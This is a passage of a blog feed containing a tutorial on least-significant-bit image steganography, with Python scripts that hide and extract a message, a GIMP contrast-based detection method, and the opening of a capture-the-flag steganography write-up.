    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Before : (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#Default values in case no bit has to be modified&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#Red pixel&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r_new_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r_new_last_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#Green pixel&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;g_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;g_new_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_new_last_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#Blue pixel&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b_new_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b_new_last_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;After: (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lsb_spongebob.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;What this script does is actually pretty simple. For each color channel of each pixel of the first row, the script extracts the least significant bit and replaces it by the result of the logical operation &lt;strong&gt;&amp;amp;&lt;/strong&gt; between &lt;em&gt;the current least significant bit&lt;/em&gt; and &lt;em&gt;the bit stored at index [i] in bit_array&lt;/em&gt;. Once the message is fully written, remaining pixels on the row are replaced by white pixels(255,255,255).&lt;/p&gt;

&lt;p&gt;I’ve also added some debugging outputs which are useful in order to illustrate the changes that are being made.&lt;/p&gt;

&lt;p&gt;This script only works for hiding short messages in the first row of the picture. It’s not optimized at all so you’ll probably write a better one but you get the idea.&lt;/p&gt;

&lt;h2 id=&quot;detection&quot;&gt;Detection&lt;/h2&gt;

&lt;p&gt;If everything went well, our message is now hidden inside “lsb_spongebob.png”. We will now study one specific method allowing us to detect such steganography techniques. There are many others which have a more mathematical approach but, since it’s not my speciality, I won’t mention them here.&lt;/p&gt;

&lt;h3 id=&quot;all-about-contrast&quot;&gt;All about contrast&lt;/h3&gt;

&lt;p&gt;The technique I’ll present you is very manual. It consists in playing with &lt;strong&gt;brightness&lt;/strong&gt; and &lt;strong&gt;contrast&lt;/strong&gt; parameters in your favorite (GNU) Image Manipulation Program, in order to spot certain irregularities. Nothing better than a concrete example. I personally use GIMP for this purpose.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Let’s open “lsb_spongebob.png” with GIMP and open the &lt;strong&gt;Brightness-Contrast&lt;/strong&gt; box under &lt;strong&gt;Colors&lt;/strong&gt; menu.&lt;/li&gt;
  &lt;li&gt;Set brightness to its minimum value and contrast to its maximum value.&lt;/li&gt;
  &lt;li&gt;Zoom in and scan for irregularities.&lt;/li&gt;
  &lt;li&gt;On the top left, you should see something like that:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/lsb_detection.png&quot; alt=&quot;LSB Detection&quot; title=&quot;LSB Detection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s really suspicious because every pixel should be white in this area.&lt;/p&gt;

&lt;p&gt;This technique is not 100% reliable but pretty straight-forward and simple.&lt;/p&gt;

&lt;p&gt;Once we’ve located the suspected hidden message, we can proceed to the extraction.&lt;/p&gt;

&lt;h2 id=&quot;extraction&quot;&gt;Extraction&lt;/h2&gt;

&lt;p&gt;We’ve detected LSB steganography inside a picture! But how can we recover the message?
Simple! We have to extract the LSBs from each pixel and then assemble the result as a string.&lt;/p&gt;

&lt;p&gt;Once again, I recommand you to write your own script because it’s the only way to make sure everything is clear in your mind. In case you encounter difficulties, you can always take inspiration from mine.&lt;/p&gt;

&lt;h3 id=&quot;python-my-love&quot;&gt;Python my love&lt;/h3&gt;

&lt;p&gt;We know that the secret is hidden in the first row, so it’s useless to iterate over the whole picture with our script.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#coding: utf-8&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsb_spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Iterate over pixels of the first row&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Store LSB of each color channel of each pixel&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extracted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Don't forget that the message was base64-encoded&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;your-turn&quot;&gt;Your Turn!&lt;/h2&gt;

&lt;p&gt;To make this tutorial a bit funnier, I’ve slightly modified &lt;a href=&quot;http://localhost:4000/assets/2018-08-12/lsb_spongebob.png&quot;&gt;lsb_spongebob.png&lt;/a&gt; and I’ve hidden a different message inside. Will you be able to recover it? :wink:&lt;/p&gt;

&lt;p&gt;Maybe this one isn’t exactly in the same place… :smiling_imp:&lt;/p&gt;

&lt;p&gt;Feel free to send me your result or to post it in the comment section! Good luck!&lt;/p&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/spongebob.png&quot;&gt;original picture (spongebob.png)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/lsb_spongebob.png&quot;&gt;modified picture (lsb_spongebob.png)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/hide_message.py&quot;&gt;hide_message.py&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://localhost:4000/assets/2018-08-12/unhide_message.py&quot;&gt;unhide_message.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its simplicity and its ability to be undetectable to the naked eye. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.</summary></entry><entry><title type="html">Basic Steganography: Vous n’avez pas les bases - NDH16</title><link href="http://localhost:4000/Basic-Steganography-Vous-navez-pas-les-bases-NDH16.html" rel="alternate" type="text/html" title="Basic Steganography: Vous n'avez pas les bases - NDH16" /><published>2018-07-05T23:30:00+02:00</published><updated>2018-07-05T23:30:00+02:00</updated><id>http://localhost:4000/Basic-Steganography-Vous-navez-pas-les-bases-NDH16</id><content type="html" xml:base="http://localhost:4000/Basic-Steganography-Vous-navez-pas-les-bases-NDH16.html">&lt;p&gt;A steganographic challenge showing the essential tools for PNG analysis and manipulating encoding bases.&lt;/p&gt;

&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#never-gonna-give-you-up&quot; id=&quot;markdown-toc-never-gonna-give-you-up&quot;&gt;Never gonna give you up&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#never-gonna-let-you-down&quot; id=&quot;markdown-toc-never-gonna-let-you-down&quot;&gt;Never gonna let you down&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

